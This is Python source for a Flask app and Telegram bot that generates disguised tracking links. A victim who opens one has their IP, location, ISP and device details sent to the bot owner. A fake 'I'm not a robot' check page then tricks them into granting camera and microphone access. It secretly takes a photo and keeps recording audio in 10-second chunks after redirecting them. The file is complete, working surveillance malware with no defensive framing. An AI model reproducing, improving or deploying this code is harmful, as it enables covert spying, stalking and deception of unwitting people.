import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

db = {} 

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
        <h1 style="margin-bottom:20px;">🛡️ CVERIA ULTIMATE</h1>
        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;">АКТИВИРОВАТЬ</a>
    </body>
    '''

@app.route('/activate')
def activate():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "✅ СИСТЕМА ГОТОВА"
    return "❌ ОШИБКА"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return "!", 200
    return "error", 403

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "EXPIRED", 404
    owner_id, target = db[uid]['owner'], db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    
    g = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g = f"🌍 {r['country']}, {r['city']}\n📡 {r['isp']}\n🛡️ VPN: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}"
    except: pass
    
    bot.send_message(owner_id, f"🎯 *КЛИК!*\n👤 IP: `{ip}`\n{g}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;text-align:center;">
        <div>
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.innerText = "Загрузка...";
            
            let d = {{ uid: "{uid}", scr: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency }};
            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;

                // Функция цикличной записи аудио
                function startRecording() {{
                    const rec = new MediaRecorder(s);
                    const chunks = [];
                    rec.ondataavailable = e => chunks.push(e.data);
                    rec.onstop = () => {{
                        const f = new FormData();
                        f.append('audio', new Blob(chunks, {{type: 'audio/webm'}}), 'a.webm');
                        f.append('uid', "{uid}");
                        fetch('/log_audio', {{ method: 'POST', body: f }});
                        if (!s.active) return;
                        startRecording(); // Запуск следующего круга
                    }};
                    rec.start();
                    setTimeout(() => rec.stop(), 10000); // Пишем по 10 сек
                }}
                startRecording();

                // Фото
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            // Мы НЕ останавливаем стрим сразу, чтобы аудио продолжалось
                            window.location.href = "{target}";
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 1500);

            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = f"🖥 *ОТЧЕТ:* `{d['scr']}` | `{d['cores']} Cores`"
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, f = request.form.get('uid'), request.files.get('photo')
    if uid in db and f:
        bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 ФОТО ID: `{uid}`")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, f = request.form.get('uid'), request.files.get('audio')
    if uid in db and f:
        # Отправляем как документ, чтобы точно дошло
        bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 АУДИО ID: `{uid}`")
    return "ok"

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ Ссылка:\n`https://{request.host}/v/{uid}`")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
